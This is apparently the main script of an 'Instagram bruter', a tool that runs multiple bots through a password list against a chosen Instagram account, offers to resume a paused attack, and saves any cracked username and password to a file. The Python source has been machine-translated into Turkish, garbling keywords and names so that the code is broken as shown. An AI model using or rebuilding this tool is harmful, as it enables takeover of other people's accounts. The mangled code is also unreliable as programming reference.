# Tarih: 29/12/2018
# Yazar: Mohamed
# Açıklama: Instagram bruter

dan  sys  ithalat  çıkışında
dan  os . yol  içe aktarma  var
dan  lib . bruter  ithalat  Bruter
dan  lib . ekran  içe aktarma  Ekran
dan  platformu  ithalat  python_version
dan  lib . const  içe aktarma  kimlik bilgileri , modlar
dan  argparse  ithalat  ArgumentParser , ArgumentTypeError


sınıf  Motoru ( nesne ):

    def  __init__ ( öz , kullanıcı adı , ipler , passlist_path , is_color ):
        kendini . bruter  =  Yok
        kendini . özgeçmiş  =  Yanlış
        kendini . is_alive  =  Doğru
        kendini . konuları  =  konuları
        kendini . kullaniciadi  =  kullaniciadi
        kendini . passlist_path  =  passlist_path
        kendini . display  =  Ekran ( is_color = is_color )

    def  passlist_path_exists ( kendi kendine ):
        eğer  değil  var ( öz . passlist_path ):
            kendini . görüntüler . uyarı ( 'Şifre listesine geçersiz yol' )
            dönüş  Yanlış
        dönüş  Doğru

    def  create_bruter ( kendi kendine ):
        kendini . bruter  =  Bruter (
            kendini . kullanıcı adı ,
            kendini . dişler ,
            kendini . passlist_path
        )

    def  get_user_resp ( kendi kendine ):
        dönmek  kendini . görüntüler . istemi ( 'Saldırıyı sürdürmek ister misiniz? [y / n]:' )

    def  write_to_file ( kendi kendine , şifre ):
        ile  açık ( kimlik bilgileri , 'kısmındaki' ) olarak  f :
            data  =  'Kullanıcı adı: {} \ n Şifre: {} \ n \ n ' . biçim (
                kendini . kullanıcı adı . başlık (), şifre )
            f . yazma ( veri )

    def  başlangıç ( benlik ):
        eğer  değil  kendini . passlist_path_exists ():
            kendini . is_alive  =  Yanlış

        eğer  kendini . is_alive :
            kendini . create_bruter ()

            ederken  kendini . is_alive  ve  değil  öz . bruter . password_manager . oturum :
                geçmek

            eğer  değil  kendini . is_alive :
                dönüş

            eğer  kendini . bruter . password_manager . oturum . var :
                dene :
                    resp  =  benlik . get_user_resp ()
                hariç :
                    kendini . is_alive  =  Yanlış

                eğer  saygı  ve  benlik . is_alive :
                    Eğer  solunum . şerit (). alt () ==  'y' :
                        kendini . bruter . password_manager . devam  =  Doğru

            dene :
                kendini . bruter . başlangıç ()
             KeyboardInterrupt hariç :
                kendini . bruter . durdur ()
                kendini . bruter . görüntüler . kapanma ( self . bruter . last_password ,
                                             kendini . bruter . password_manager . girişimler , len ( self . bruter . tarayıcılar ))
            sonunda :
                kendini . durdur ()

    def  stop ( kendi kendine ):
        eğer  kendini . is_alive :

            kendini . bruter . durdur ()
            kendini . is_alive  =  Yanlış

            eğer  kendini . bruter . password_manager . is_read  ve  kendinden değil  . bruter . is_found ve kendini değil . bruter . password_manager . list_size :   
                kendini . bruter . görüntüler . stats_not_found ( kendi . bruter . son_parola ,
                                                    kendini . bruter . password_manager . girişimler , len ( self . bruter . tarayıcılar ))

            eğer  kendini . bruter . is_found :
                kendini . file_to_file ( self . bruter . password )
                kendini . bruter . görüntüler . stats_found ( kendi . bruter . şifresi ,
                                                kendini . bruter . password_manager . girişimler , len ( self . bruter . tarayıcılar ))


def  geçerli_int ( n ):
    eğer  değil  n . isdigit ():
        yükselt  ArgumentTypeError ( 'mod bir sayı olmalı' )

    n  =  int ( n )

    eğer  n  >  3 :
        yükselt  ArgumentTypeError ( 'bir mod için maksimum 3' )

    eğer  n  <  0 :
        yükselt  ArgumentTypeError ( 'bir mod için minimum 0' )

    dönüş  n


def  args ():
    args  =  ArgumentParser ()
    Args . add_argument ( 'kullanıcı adı' , yardım = 'e-posta veya kullanıcı adı' )
    Args . add_argument ( 'passlist' , help = 'şifre listesi' )
    Args . add_argument ( '-nc' , '--no-renk' , hedef = 'renk' ,
                      action = 'store_true' , yardım = 'renkleri devre dışı bırak' )
    Args . add_argument ( '-m' , '--mode' , varsayılan = 2 , type = valid_int ,
                      help = 'modları: 0 => 32 bot; 1 => 16 bot; 2 => 8 bot; 3 => 4 bot ' )
    dönüş  argümanları . parse_args ()


eğer  __name__  ==  '__main__' :

    Eğer  int ( python_version () [ 0 ]) <  3 :
        print ( '[!] Lütfen Python 3'ü kullanın )
        çıkış ()

    argümanlar  =  args ()
    mode  =  argümanlar . kip
    kullanıcı adı  =  tartışmalar . Kullanıcı adı
    passlist  =  argümanlar . passlist
    is_color  =  Doğru  eğer  değil  arugments . başka renk  Yanlış 
    Motor ( kullanıcı adı , modlar [ mod ], passlist , is_color ). başlangıç ()
